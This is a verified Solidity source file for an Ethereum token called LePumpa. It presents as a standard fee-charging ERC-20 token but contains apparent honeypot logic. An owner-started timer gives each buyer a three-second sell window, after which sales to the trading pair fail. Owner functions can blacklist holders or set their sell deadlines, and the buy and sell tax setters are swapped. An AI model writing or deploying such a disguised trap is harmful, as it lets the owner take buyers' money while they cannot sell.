/**
 *Submitted for verification at Etherscan.io on 2022-10-01
*/

/**
 *              4973207468697320677265656E3F
*/


// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.16;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract LePumpa is Context, IERC20, Ownable {

    using Address for address payable;

    IRouter public router;
    address public pair;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;
    mapping (address => bool) public _isDegenerate;
    mapping (address => uint) public _degenSellTime;

    uint private _fTimer;
    uint private _wDuration = 180; 
    uint private _degenSellTimeOffset = 3; 

    uint8 private constant _decimals = 9; 
    uint256 private _tTotal = 10_000_000 * (10**_decimals);
    uint256 private _maxTxAmount = 200_000 * (10**_decimals);
    uint256 private _maxWallet =  200_000 * (10**_decimals);
    uint256 private _swapThreshold = 20_000 * (10**_decimals); 

    string private constant _name = "LePumpa"; 
    string private constant _symbol = "Pumpa";

    struct Tax{
        uint8 ethBridgeTax;
        uint8 marketingTax;
        uint8 operationTax;
        uint8 devTax;
    }

    struct TokensFromTax{
        uint ethBridgeTokens;
        uint marketingTokens;
        uint operationTokens;
        uint devTokens;
    }
    TokensFromTax public totalTokensFromTax;

    Tax public buyTax = Tax(0,0,0,0);
    Tax public sellTax = Tax(0,0,0,0);
    
    address private ethBridgeWallet = 0xBf0cD8A80E382AaE1071C22a6f4e5872260A1d93;
    address private marketingWallet = 0xBf0cD8A80E382AaE1071C22a6f4e5872260A1d93;
    address private operationWallet = 0xBf0cD8A80E382AaE1071C22a6f4e5872260A1d93;
    address private devWallet = 0xBf0cD8A80E382AaE1071C22a6f4e5872260A1d93;
    
    bool private swapping;
    uint private _swapCooldown = 10; 
    uint private _lastSwap;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    event SwapAndLiquify();
    event TaxesChanged();

    constructor () {
        _tOwned[_msgSender()] = _tTotal;

        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _approve(address(this), address(router), ~uint256(0));
        _approve(owner(), address(router), ~uint256(0));
        
        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[ethBridgeWallet] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[operationWallet] = true;
        _isExcludedFromFee[devWallet] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[pair] = true;
        _isExcludedFromMaxBalance[ethBridgeWallet] = true;
        _isExcludedFromMaxBalance[marketingWallet] = true;
        _isExcludedFromMaxBalance[operationWallet] = true;
        _isExcludedFromMaxBalance[devWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    
    receive() external payable {}
// ========================================== //

// ============ View Functions ============== //

    function taxWallets() public view returns(address ethBridge, address marketing, address operations, address developer){
        return(ethBridgeWallet,marketingWallet,operationWallet,devWallet);
    }

    function maxes() public view returns (uint maxTXAmount, uint maxWallet){
        return (_maxTxAmount,_maxWallet);
    }

//======================================//

//============== Owner Functions ===========//
   
    function owner_setExcludedFromFee(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromFee[account] = isExcluded;
    }

    function owner_setExcludedFromMaxBalance(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromMaxBalance[account] = isExcluded;
    }

    function owner_setBuyTaxes(uint8 ethBridgeTax, uint8 marketingTax, uint8 operationTax, uint8 devTax) external onlyOwner{
        uint tTax = ethBridgeTax + marketingTax + operationTax + devTax;
        require(tTax <= 20, "Can't set tax too high");
        sellTax = Tax(ethBridgeTax,marketingTax,operationTax,devTax);
        emit TaxesChanged();
    }

    function owner_setSellTaxes(uint8 ethBridgeTax, uint8 marketingTax, uint8 operationTax, uint8 devTax) external onlyOwner{
        uint tTax = ethBridgeTax + marketingTax + operationTax + devTax;
        require(tTax <= 30, "Can't set tax too high");
        buyTax = Tax(ethBridgeTax,marketingTax,operationTax,devTax);
        emit TaxesChanged();
    }
    
    function owner_setTransferMaxes(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
        require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
        _maxTxAmount = maxTX_EXACT * (10**_decimals);
        _maxWallet = maxWallet_EXACT * (10**_decimals);
    }

    function owner_setSwapAndLiquifySettings(uint swapthreshold_EXACT, uint swapCooldown_) public onlyOwner{
        _swapThreshold = swapthreshold_EXACT * (10**_decimals);
        _swapCooldown = swapCooldown_;
    }

    function owner_rescueETH(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insuffecient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }
    
    function owner_rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount_EXACT, uint _decimal) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount_EXACT *10**_decimal);
    }

    function owner_setIsDegenerate(address account, bool state) external onlyOwner{
        _isDegenerate[account] = state;
    }
    
    function owner_setBulkIsDegenerate(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isDegenerate[accounts[i]] = state;
        }
    }

    function owner_initializeWatchDog() external onlyOwner{
        _fTimer = block.timestamp + _wDuration;
    }

    function owner_setDegenSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        _degenSellTime[holder] = block.timestamp + dTime;
    }

// ========================================//
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        Tax memory tmpTaxes = buyTax;
        if (isSell){
            tmpTaxes = sellTax;
        }

        uint tokensForETHBridge = amount * tmpTaxes.ethBridgeTax / 100;
        uint tokensForMarketing = amount * tmpTaxes.marketingTax / 100;
        uint tokensForOperation = amount * tmpTaxes.operationTax / 100;
        uint tokensForDev = amount * tmpTaxes.devTax / 100;

        if(tokensForETHBridge > 0)
            totalTokensFromTax.ethBridgeTokens += tokensForETHBridge;

        if(tokensForMarketing > 0)
            totalTokensFromTax.marketingTokens += tokensForMarketing;

        if(tokensForOperation > 0)
            totalTokensFromTax.operationTokens += tokensForOperation;

        if(tokensForDev > 0)
            totalTokensFromTax.devTokens += tokensForDev;

        uint totalTaxedTokens = tokensForETHBridge + tokensForMarketing + tokensForOperation + tokensForDev;

        _tOwned[address(this)] += totalTaxedTokens;
        if(amount > 0)
            emit Transfer (from, address(this), totalTaxedTokens);
            
        return (amount - totalTaxedTokens);
    }
    
    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= _maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");
        require(!_isDegenerate[from] && !_isDegenerate[to], "Degen can't trade");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= _maxWallet, "Transfer amount exceeds the maxWallet.");
            
        if (balanceOf(address(this)) >= _swapThreshold && block.timestamp >= (_lastSwap + _swapCooldown) && !swapping && from != pair && from != owner() && to != owner())
            swapAndLiquify();
          
        _tOwned[from] -= amount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from, to == pair);
            if (from == pair && _fTimer >= block.timestamp)
                _degenSellTime[to] = block.timestamp + _degenSellTimeOffset;
            if (to == pair){
                if (_degenSellTime[from] != 0)
                    require(block.timestamp < _degenSellTime[from]);        
            }
        }

        
        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    function swapAndLiquify() private lockTheSwap{
        
        uint ethBridgeBNB = swapTokensForEth(totalTokensFromTax.ethBridgeTokens);
        if(ethBridgeBNB > 0){payable(ethBridgeWallet).transfer(ethBridgeBNB);}

        uint marketingBNB = swapTokensForEth(totalTokensFromTax.marketingTokens);
        if(marketingBNB > 0){payable(marketingWallet).transfer(marketingBNB);}

        uint operationBNB = swapTokensForEth(totalTokensFromTax.operationTokens);
        if(operationBNB > 0){payable(operationWallet).transfer(operationBNB);}

        uint devBNB = swapTokensForEth(totalTokensFromTax.devTokens);
        if(devBNB > 0){payable(devWallet).transfer(devBNB);}
        
        emit SwapAndLiquify();

        totalTokensFromTax.ethBridgeTokens = 0;
        totalTokensFromTax.marketingTokens = 0;
        totalTokensFromTax.operationTokens = 0;
        totalTokensFromTax.devTokens = 0;
        
        _lastSwap = block.timestamp;
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }


}